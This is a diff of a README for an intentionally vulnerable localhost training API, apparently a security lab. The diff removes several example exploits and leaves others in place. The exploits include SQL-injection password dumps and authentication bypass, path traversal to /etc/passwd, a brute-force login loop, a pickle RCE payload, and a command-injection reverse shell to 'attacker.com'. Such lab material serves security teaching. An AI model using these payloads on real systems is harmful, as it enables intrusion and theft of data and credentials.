@@ -18,22 +18,13 @@ This API has been modified to contain **intentional security vulnerabilities** r
 - `PUT /products/{product_id}` - Any user can update any product
 - `DELETE /products/{product_id}` - Any user can delete any product
 - `PUT /inventory/{product_id}` - Unrestricted inventory modifications
-- `GET /admin/*` - Admin endpoints accessible without authentication
-- `GET /admin/read-file/` - Path traversal vulnerability
 - `GET /users/list/` - Exposes all user data without authentication
 - `GET /transactions/user/{user_name}` - IDOR - access to other users' transactions
-- `GET /auth/reset-password/` - Password reset without verification
 
 **Example Exploit**:
 ```bash
 # Delete any product without authentication
 curl -X DELETE http://localhost:8000/products/1
-
-# Read sensitive files using path traversal
-curl "http://localhost:8000/admin/read-file/?filepath=/etc/passwd"
-
-# View other users' transactions
-curl "http://localhost:8000/transactions/user/admin"
 ```
 
 ---
@@ -51,8 +42,6 @@ curl "http://localhost:8000/transactions/user/admin"
 
 **Affected Endpoints**:
 - `GET /products/export/` - Exposes profit margins and internal costs
-- `POST /auth/login/` - Returns plain text credentials
-- `POST /auth/register/` - Stores passwords in plain text
 - `GET /debug/env/` - Exposes all environment variables including secrets
 - `GET /` - Exposes database connection strings
 
@@ -75,27 +64,15 @@ curl "http://localhost:8000/debug/env/"
 - `GET /products/search/` - SQL Injection in search query
 - `GET /products/category/{category}` - SQL Injection in category filter
 - `GET /transactions/user/{user_name}` - SQL Injection in username filter
-- `POST /auth/login/` - SQL Injection in authentication
-- `POST /auth/register/` - SQL Injection in registration
 - `POST /inventory/adjust-by-query/` - Direct SQL injection
-- `GET /admin/execute/` - Command Injection
 
 **Example Exploits**:
 ```bash
 # SQL Injection - Dump all products
 curl "http://localhost:8000/products/category/electronics' OR '1'='1"
 
-# SQL Injection - Authentication bypass
-curl -X POST "http://localhost:8000/auth/login/?username=admin'--&password=anything"
-
 # SQL Injection in search (data exfiltration)
 curl "http://localhost:8000/products/search/?query=' UNION SELECT password,username,email,null,null,null,null FROM users--"
-
-# Command Injection - Execute arbitrary commands
-curl "http://localhost:8000/admin/execute/?cmd=cat%20/etc/passwd"
-
-# Command Injection - Reverse shell (EXTREMELY DANGEROUS)
-curl "http://localhost:8000/admin/execute/?cmd=nc%20-e%20/bin/bash%20attacker.com%204444"
 ```
 
 ---
@@ -113,7 +90,6 @@ curl "http://localhost:8000/admin/execute/?cmd=nc%20-e%20/bin/bash%20attacker.co
 
 **Affected Endpoints**:
 - `POST /products/bulk-update/` - Mass assignment vulnerability
-- `POST /auth/login/` - No rate limiting (brute force)
 - `POST /inventory/adjust-by-query/` - Dangerous custom SQL functionality
 - All endpoints - No rate limiting
 
@@ -123,11 +99,6 @@ curl "http://localhost:8000/admin/execute/?cmd=nc%20-e%20/bin/bash%20attacker.co
 curl -X POST "http://localhost:8000/products/bulk-update/" \
   -H "Content-Type: application/json" \
   -d '{"products": [{"id": 1, "price": 0.01, "created_at": "2030-01-01"}]}'
-
-# Brute force login (no rate limiting)
-for i in {1..10000}; do
-  curl -X POST "http://localhost:8000/auth/login/?username=admin&password=pass$i"
-done
 ```
 
 ---
@@ -163,86 +134,18 @@ app.add_middleware(
 
 ---
 
-### Vulnerable and Outdated Components
-
-**Description**: Use of inherently unsafe libraries and lack of dependency management.
-
-**Vulnerabilities**:
-- `pickle` module used for deserialization (inherently unsafe)
-- No dependency pinning in `pyproject.toml`
-- No security scanning of dependencies
-- Potentially outdated packages
-
-**Affected Endpoints**:
-- `POST /admin/deserialize/` - Uses pickle for deserialization
-
-**Example Exploit**:
-```python
-# Create malicious pickle payload for RCE
-import pickle, base64, os
-
-class Exploit:
-    def __reduce__(self):
-        return (os.system, ('whoami',))
-
-payload = base64.b64encode(pickle.dumps(Exploit()))
-print(payload.decode())
-
-# Send to endpoint
-# curl -X POST "http://localhost:8000/admin/deserialize/" -d "data=<payload>"
-```
-
----
-
-### Identification and Authentication Failures
-
-**Description**: Weak authentication mechanisms and insecure session management.
-
-**Vulnerabilities**:
-- No password hashing (plain text storage)
-- No password complexity requirements
-- SQL injection in login
-- Predictable session tokens (`username:role` format)
-- No rate limiting on authentication attempts
-- No account lockout mechanism
-- No multi-factor authentication
-- Password reset without email verification
-
-**Affected Endpoints**:
-- `POST /auth/login/` - Multiple authentication failures
-- `POST /auth/register/` - No password requirements
-- `GET /auth/reset-password/` - No verification required
-
-**Example Exploits**:
-```bash
-# SQL Injection bypass authentication
-curl -X POST "http://localhost:8000/auth/login/?username=admin'%20OR%20'1'='1'--&password=anything"
-
-# Weak passwords accepted
-curl -X POST "http://localhost:8000/auth/register/?username=test&password=1&email=test@test.com"
-
-# Reset anyone's password without verification
-curl "http://localhost:8000/auth/reset-password/?username=admin&new_password=hacked"
-
-# Predictable token format (can be guessed)
-# Token format: "username:role" - e.g., "admin:admin" or "user:user"
-```
-
----
 
 ### Software and Data Integrity Failures
 
 **Description**: No validation of data integrity and insecure deserialization.
 
 **Vulnerabilities**:
-- Insecure deserialization using `pickle`
 - No input validation on critical fields
 - No integrity checks on data modifications
 - Mass assignment without field validation
 - No checksums or signatures
 
 **Affected Endpoints**:
-- `POST /admin/deserialize/` - Arbitrary code execution via pickle
 - `POST /products/bulk-update/` - No validation of updated data
 - `PUT /products/{product_id}` - No input validation
 
